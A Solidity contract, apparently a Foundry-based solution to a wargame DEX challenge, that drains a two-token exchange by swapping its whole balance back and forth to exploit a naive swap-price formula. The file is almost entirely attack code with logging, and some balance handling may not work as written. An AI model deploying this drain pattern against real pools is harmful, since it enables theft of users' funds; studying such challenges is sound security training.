pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDex{
    function token1() external returns(address);
    function token2() external returns(address);
    function swap(address from, address to, uint amount) external;
    function getSwapPrice(address from, address to, uint amount) external view returns(uint);    
    function balanceOf(address token, address account) external view returns (uint);
}

contract AttackDex{        
    IDex public dex;    
    address public token1;
    address public token2;

    constructor(address _victim) {
        dex = IDex(_victim);
        token1 = dex.token1();
        token2 = dex.token2();
    }
    
    function lowerboundSwap(address from, address to, uint amount) private {
        bool exceedsReserves =  (dex.getSwapPrice(from, to, amount) > dex.balanceOf(to,address(dex)));
        uint newAmount = exceedsReserves ? dex.balanceOf(from,address(dex)) : amount;
        dex.swap(from ,to, newAmount);        
    }

    function attack() public {
        console.log(dex.balanceOf(token2, msg.sender));
        console.log(dex.balanceOf(token2, address(dex)));
        console.log(IERC20(token2).balanceOf(msg.sender));
        dex.swap(token2, token1, dex.balanceOf(token2, msg.sender)); //start player where all in token1
        address tokenFrom = token1;
        address tokenTo = token2;
        while ((dex.balanceOf(token1,address(dex)) > 0)&&(dex.balanceOf(token2,address(dex)) > 0)) {
            console.log("token1:", dex.balanceOf(token1,msg.sender));
            console.log("token2:", dex.balanceOf(token2,msg.sender));
            lowerboundSwap(tokenFrom, tokenTo, dex.balanceOf(tokenFrom,msg.sender));
            (tokenFrom, tokenTo) = (tokenTo, tokenFrom);
        }

    }
}
